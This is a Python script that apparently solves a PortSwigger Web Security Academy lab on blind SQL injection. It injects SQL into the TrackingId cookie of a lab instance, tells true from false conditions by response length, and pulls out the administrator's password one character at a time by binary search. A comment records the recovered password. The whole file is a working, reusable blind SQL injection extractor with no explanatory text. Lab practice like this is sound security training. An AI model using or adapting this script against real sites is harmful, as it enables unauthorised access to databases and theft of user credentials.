# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

import requests
requests.packages.urllib3.disable_warnings()

base = "https://acdb1f7d1e55404380a2442800360083.web-security-academy.net"
url = base

proxy = "127.0.0.1:8080"
proxies = {"https": proxy, "http": proxy}
verify = False
cookies = {"session": "iZBX4ehYKKpF95lQkMKvFbqpG8qdM7U2"}
key = "TrackingId"
sqliPrefix = "' UNION SELECT 'a' FROM users WHERE username = 'administrator' AND"

def findNumberOfColumns():
    for i in range(1,5):
        value = f"' OR 1=1 ORDER BY {i}-- "
        cookies[key] = value
        requests.get(url, verify=verify, proxies=proxies, cookies=cookies)
        del cookies[key]

def determineStringLength():
    for i in range(1,25):
        value = f"{sqliPrefix} LENGTH(password) > {i}-- "
        cookies[key] = value
        requests.get(url, verify=verify, proxies=proxies, cookies=cookies)
        del cookies[key]


def conditionalResponses(): # 20 len
    def findLengthOfTrueResponse():
        lengths = {}
        for i in range(32, 127):
            value = f"{sqliPrefix} SUBSTRING(password, 1, 1) = '{chr(i)}'-- "
            cookies[key] = value
            r = requests.get(url, verify=verify, proxies=proxies, cookies=cookies)
            l = len(r.content)
            if l in lengths:
                lengths[l] += 1
            else:
                lengths[l] = 1

        for k, v in lengths.items():
            print(f"{k}: {v}")

    def determinePasswordUsingBinarySearch():
        def getResponseFromRequest(i, operator, pwdSubstr):
            value = f"{sqliPrefix} SUBSTRING(password, {i}, 1) {operator} '{pwdSubstr}'-- "
            cookies[key] = value
            r = requests.get(url, verify=verify, proxies=proxies, cookies=cookies)
            del cookies[key]
            return r

        def makeRequestAndDetermineIfResponseIndicatesSQLQueryReturnedTrue(i, operator, pwdSubstr):
            l = 10994
            r = getResponseFromRequest(i, operator, pwdSubstr)
            return len(r.content) == l

        password = []
        for i in range(1,21):
            l = 32
            r = 127
            while l <= r:
                index = (l + r) // 2
                pwdSubstr = chr(index)
                if makeRequestAndDetermineIfResponseIndicatesSQLQueryReturnedTrue(i, "<", pwdSubstr): l = index + 1
                elif makeRequestAndDetermineIfResponseIndicatesSQLQueryReturnedTrue(i, ">", pwdSubstr): r = index - 1
                else:
                    password.append(pwdSubstr)
                    break
        print(''.join(password))
        # ugjsbdavzeyhta1p86u3

    # findLengthOfTrueResponse()
    determinePasswordUsingBinarySearch()


# findNumberOfColumns()
# determineStringLength()
conditionalResponses()